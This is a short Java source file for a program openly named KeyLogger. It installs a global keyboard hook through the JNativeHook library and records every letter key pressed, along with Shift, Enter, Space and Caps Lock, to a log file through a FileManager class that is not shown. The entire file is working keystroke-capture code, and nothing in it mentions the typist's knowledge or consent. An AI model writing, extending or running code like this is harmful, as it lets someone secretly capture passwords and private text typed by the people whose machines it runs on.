package dev.source.logger;

import java.io.IOException;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import dev.source.utility.Commons;

public class KeyLogger implements NativeKeyListener {
  private StringBuilder stringBuilder;
  private FileManager fileManger;

  public KeyLogger() throws IOException {
    fileManger = FileManager.getInstance();
  }

  @Override
  public void nativeKeyPressed(NativeKeyEvent keyEvent) {
    if (keyEvent.getKeyCode() == NativeKeyEvent.VC_SHIFT
        || keyEvent.getKeyCode() == NativeKeyEvent.VC_ENTER
        || keyEvent.getKeyCode() == NativeKeyEvent.VC_SPACE
        || keyEvent.getKeyCode() == NativeKeyEvent.VC_CAPS_LOCK) {
      stringBuilder =
          new StringBuilder("[" + NativeKeyEvent.getKeyText(keyEvent.getKeyCode()) + "]");
      fileManger.log(stringBuilder.toString().toUpperCase());
    }
    if (Commons.isLetter(keyEvent.getKeyCode())) {
      fileManger.log(NativeKeyEvent.getKeyText(keyEvent.getKeyCode()));
    }
  }

  @Override
  public void nativeKeyReleased(NativeKeyEvent keyEvent) {}

  @Override
  public void nativeKeyTyped(NativeKeyEvent keyEvent) {}

  public static void main(String[] args) throws IOException, NativeHookException {
    GlobalScreen.registerNativeHook();
    GlobalScreen.addNativeKeyListener(new KeyLogger());
  }
}
